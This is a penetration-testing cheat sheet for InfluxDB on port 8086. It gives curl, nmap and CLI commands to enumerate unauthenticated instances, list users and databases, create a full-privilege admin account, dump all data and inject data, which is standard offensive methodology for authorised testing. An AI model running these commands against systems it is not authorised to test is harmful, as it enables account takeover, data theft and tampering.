# Port 8086 - InfluxDB

## Table of Contents
- [Enumeration](#enumeration)
- [Database Access](#database-access)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
curl -s "http://$rhost:8086/ping" && curl -s "http://$rhost:8086/query?q=SHOW+DATABASES" | jq
```

### Nmap

```shell
nmap -sV -sC -p 8086 $rhost
```

### Check InfluxDB

```shell
# Ping
curl -s "http://$rhost:8086/ping"

# Health check
curl -s "http://$rhost:8086/health"

# Version (may require auth)
curl -s "http://$rhost:8086/query?q=SHOW+DIAGNOSTICS"
```

---

## Database Access

### HTTP API (InfluxDB 1.x)

```shell
# List databases
curl -s "http://$rhost:8086/query?q=SHOW+DATABASES" | jq

# List measurements (tables)
curl -s "http://$rhost:8086/query?db=mydb&q=SHOW+MEASUREMENTS" | jq

# List users
curl -s "http://$rhost:8086/query?q=SHOW+USERS" | jq

# Query data
curl -s "http://$rhost:8086/query?db=mydb&q=SELECT+*+FROM+cpu+LIMIT+10" | jq
```

### With Authentication

```shell
# Using basic auth
curl -u admin:password -s "http://$rhost:8086/query?q=SHOW+DATABASES"

# Using query params
curl -s "http://$rhost:8086/query?u=admin&p=password&q=SHOW+DATABASES"
```

### InfluxDB CLI

```shell
# Connect (InfluxDB 1.x)
influx -host $rhost -port 8086

# With authentication
influx -host $rhost -port 8086 -username admin -password password

# Commands inside CLI
SHOW DATABASES
USE mydb
SHOW MEASUREMENTS
SELECT * FROM measurement_name LIMIT 10
SHOW USERS
```

---

## Exploitation

### No Authentication

```shell
# Check if auth required
curl -s "http://$rhost:8086/query?q=SHOW+DATABASES"

# If returns data, no auth required!
```

### Create Admin User

```shell
# If no admin exists (InfluxDB 1.x)
curl -X POST "http://$rhost:8086/query" \
  --data-urlencode "q=CREATE USER admin WITH PASSWORD 'hacked' WITH ALL PRIVILEGES"
```

### Extract All Data

```shell
# List databases
curl -s "http://$rhost:8086/query?q=SHOW+DATABASES" | jq

# For each database, get measurements
curl -s "http://$rhost:8086/query?db=mydb&q=SHOW+MEASUREMENTS" | jq

# Dump all data
curl -s "http://$rhost:8086/query?db=mydb&q=SELECT+*+FROM+/.*/+LIMIT+1000" | jq
```

### Write Malicious Data

```shell
# Write data (Line Protocol)
curl -X POST "http://$rhost:8086/write?db=mydb" \
  --data-binary 'malicious_measurement,tag=evil value=666'
```

### JWT Token Exploitation (if found)

```shell
# InfluxDB shared secret may allow token forgery
# Check for INFLUXDB_HTTP_SHARED_SECRET in config
```

---

## InfluxDB 2.x API

```shell
# InfluxDB 2.x uses different API

# Health
curl -s "http://$rhost:8086/api/v2/health"

# Query (requires token)
curl -s "http://$rhost:8086/api/v2/query" \
  -H "Authorization: Token $token" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "from(bucket:\"mybucket\") |> range(start: -1h)"
  }'
```

---

## Quick Reference

| Endpoint | Description |
| :--- | :--- |
| `/ping` | Health check |
| `/query` | Execute queries |
| `/write` | Write data |
| `/health` | Detailed health |

| Query | Description |
| :--- | :--- |
| `SHOW DATABASES` | List databases |
| `SHOW MEASUREMENTS` | List tables |
| `SHOW USERS` | List users |
| `SELECT * FROM table` | Query data |
